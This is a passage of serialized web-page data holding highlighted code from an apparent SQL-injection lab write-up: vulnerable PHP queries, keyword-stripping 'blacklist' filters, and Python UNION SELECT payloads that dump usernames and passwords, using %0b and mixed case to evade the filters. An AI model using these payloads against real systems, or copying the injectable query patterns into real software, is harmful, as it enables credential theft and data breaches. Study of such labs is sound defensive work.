punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003epreg_replace\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$reg1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$replace\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token variable\"\u003e$sql\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"SELECT * FROM users WHERE id='\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003c/span\u003e' LIMIT 0,1\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n29:T9f1,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token variable\"\u003e$username\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$_SESSION\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string double-quoted-string\"\u003e\"username\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token variable\"\u003e$curr_pass\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003emysql_real_escape_string\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$_POST\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'current_password'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token variable\"\u003e$pass\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003emysql_real_escape_string\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$_POST\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'password'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token variable\"\u003e$re_pass\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003emysql_real_escape_string\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$_POST\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e're_password'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$pass\u003c/span\u003e\u003cspan class=\"token operator\"\u003e==\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$re_pass\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$sql\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"UPDATE users SET password='\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token variable\"\u003e$pass\u003c/span\u003e\u003c/span\u003e' WHERE username='\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token variable\"\u003e$username\u003c/span\u003e\u003c/span\u003e' AND password='\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token variable\"\u003e$curr_pass\u003c/span\u003e\u003c/span\u003e'\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token comment\"\u003e// ...\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"2a:T1454,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"token function-definition function\"\u003eblacklist\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003epreg_replace\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'/or/i'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e       \u003cspan class=\"token comment\"\u003e// strip out OR (non case sensitive)\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003epreg_replace\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'/and/i'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e      \u003cspan class=\"token comment\"\u003e// Strip out AND (non case sensitive)\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003epreg_replace\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'/[\\/\\*]/'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e    \u003cspan class=\"token comment\"\u003e// strip out /*\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003epreg_replace\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'/[--]/'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e      \u003cspan class=\"token comment\"\u003e// Strip out --\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003epreg_replace\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'/[#]/'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e       \u003cspan class=\"token comment\"\u003e// Strip out #\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003epreg_replace\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'/[\\s]/'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e      \u003cspan class=\"token comment\"\u003e// Strip out spaces\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003epreg_replace\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'/[\\/\\\\\\\\]/'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e// Strip out slashes\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'id'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003eblacklist\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token variable\"\u003e$sql\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"SELECT * FROM users WHERE id='\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003c/span\u003e' LIMIT 0,1\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"2b:T1a9e,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"token function-definition function\"\u003eblacklist\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003epreg_replace\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'/[\\/\\*]/'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e   \u003cspan class=\"token comment\"\u003e// Strip out /*\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003epreg_replace\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'/[--]/'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e     \u003cspan class=\"token comment\"\u003e// Strip out --.\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003epreg_replace\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'/[#]/'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e      \u003cspan class=\"token comment\"\u003e// Strip out #.\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003epreg_replace\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'/[ +]/'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e     \u003cspan class=\"token comment\"\u003e// Strip out spaces.\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003epreg_replace\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'/union/s'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e   \u003cspan class=\"token comment\"\u003e// Strip out union\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003epreg_replace\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'/select/s'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e// Strip out select\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003epreg_replace\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'/UNION/s'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e   \u003cspan class=\"token comment\"\u003e// Strip out UNION\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003epreg_replace\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'/SELECT/s'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e// Strip out SELECT\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003epreg_replace\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'/Union/s'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e   \u003cspan class=\"token comment\"\u003e// Strip out Union\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003epreg_replace\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'/Select/s'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e// Strip out select\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'id'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003eblacklist\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token variable\"\u003e$sql\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"SELECT * FROM users WHERE id='\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003c/span\u003e' LIMIT 0,1\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"2c:T443,payload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"?id=x' UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users WHERE '1'='1\"\u003c/span\u003e\npayload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e payload\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ereplace\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\" \"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"%0b\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\npayload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e payload\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ereplace\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"UNION\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"UNiON\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\npayload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e payload\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ereplace\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"SELECT\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"SEleCT\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n2d:T443,payload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e'?id=x\" UNION SELECT 0,group_concat(username),group_concat(password) FROM security.users WHERE \"1\"=\"1'\u003c/span\u003e\npayload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e payload\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ereplace\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\" \"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"%0b\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\npayload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e payload\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ereplace\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"UNION\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"UNiON\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\npayload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e payload\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ereplace\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"tok"])</script><script>self.__next_f.push([1,"en string\"\u003e\"SELECT\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"SEleCT\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n2e:T1010,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"token function-definition function\"\u003eblacklist\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003epreg_replace\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'/[\\/\\*]/'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e           \u003cspan class=\"token comment\"\u003e//strip out /*\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003epreg_replace\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'/[--]/'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e             \u003cspan class=\"token comment\"\u003e//Strip out --.\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003epreg_replace\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'/[#]/'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e              \u003cspan class=\"token comment\"\u003e//Strip out #.\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003epreg_replace\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'/[ +]/'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token 